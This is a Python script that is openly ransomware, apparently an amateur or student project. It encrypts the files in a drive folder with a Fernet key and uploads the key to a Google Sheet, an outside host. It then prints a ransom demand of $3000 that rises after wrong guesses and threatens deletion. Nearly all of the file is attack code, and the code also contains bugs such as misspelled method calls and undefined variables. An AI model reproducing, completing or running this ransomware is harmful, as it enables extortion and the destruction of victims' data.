#!/usr/bin/env python3
import logging #for logging events and messages that occur during the execution of a program.(record the information about the behavior of the program)
import os # to interact with the operating system
import sys # to interact with runtime envirnmet
from cached_property import cached_property # to reduce compution time and imporve the performance
from cryptography.fernet import Fernet
import gspread
from oauth2client.service_account import ServiceAccountCredentials
scope = ["https://spreadsheets.google.com/feeds"]
creds = ServiceAccountCredentials.from_json_keyfile_name("core-waters-413220-4393b20b6e36.json", scope)
client = gspread.authorize(creds)
sheet = client.open("The_key").sheet1


num_infected_files = 0 # the number of the infected files
files = []
folders=[]
fpath="E:/"
list_files=os.listdir(os.chdir(fpath))
f=os.listdir()
key=Fernet.generate_key()
money=3000



class FileInfector:  #This class represents the code injecting malware.
    def __init__(self, name):
        self._name = name

    @property
    def name(self): # Name of the malware.
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name



    def infected_folder(): #the target(folder path )
        """ Perform file infection on all files in the
        given directory specified by path.
        :param str path: Path of the folder to be infected.
        :returns: Number of injected files (`int`).
        """
        for file in list_files:
            if not (file.endswith(".txt") or file.endswith(".py") or file.endswith(".png")) or file.endswith(".jfif") or file.endswith(".html") or file.endswith(".pdf") or file.endswith("."):
                folders.append(file)

            else:
                if file == 'key.txt'or file=='good.py'or file=='second.py' or file=='first.py'  or file=='fdec.py':
                    continue
                else:
                    files.append(file)

        # to stor the key
        # with open("key.txt" , "wb") as thekey:
        #     thekey.write(key)
        sheet.insert_rows(key,row=2)



        #to encrypt the all the files
        for file in files:
            try:
                with open(file , "r") as thefile :
                    contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file , "w") as thefile :
                    thefile.write(contents_encrypted)

            except IOError as e:
                 logging.error('Failed to infect file: {}'.format(file))

    infected_folder()


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    print("All Your File Has Been Encrypted Send Me 3000$ or I Will Delete Them In 24 Hours ")
    code_injector = FileInfector()
    a=print(input("If you want to decrypt your data, you have to enter The correct key: "))
    # to get the key

    # with open("key.txt" , "rb") as thekey:
    #     thekey.read(key)
    thekey= sheet.get_all_records()
    if thekey==a:
        for file in files:
            try:
                with open(file , "r") as thefile :
                    contents = thefile.read()
                contents_encrypted = Fernet(key).dencrypt(contents)
                with open(file , "w") as thefile :
                    thefile.write(contents_dencrypted)
                print("Congrats sir/Madam, your files are decrypted. Enjoy your day. ")

            except IOError as e:
                logging.error('Failed to infect file: {}'.format(file))
    else:
        print("I due apologize Sir/Madam, you have to pay more money:3300$ /n Two times left , try over")
        for i in range(2):
            a=print(input("If you want to decrypt your data, you have to enter The correct key: "))
            if thekey==a:
                for file in files:
                    try:
                        with open(file , "r") as thefile :
                            contents = thefile.read()
                        contents_encrypted = Fernet(key).dencrypt(contents)
                        with open(file , "w") as thefile :
                                thefile.write(contents_dencrypted)
                        print("Congrats sir/Madam, your files are decrypted. Enjoy your day. ")

                    except IOError as e:
                        logging.error('Failed to infect file: {}'.format(file))
            else:
                print("I due apologize Sir/Madam, you have to pay more money: 3600$ /n a try    left , try over ")
    print("Your filer're going to be deleted in the folloing houres. ")

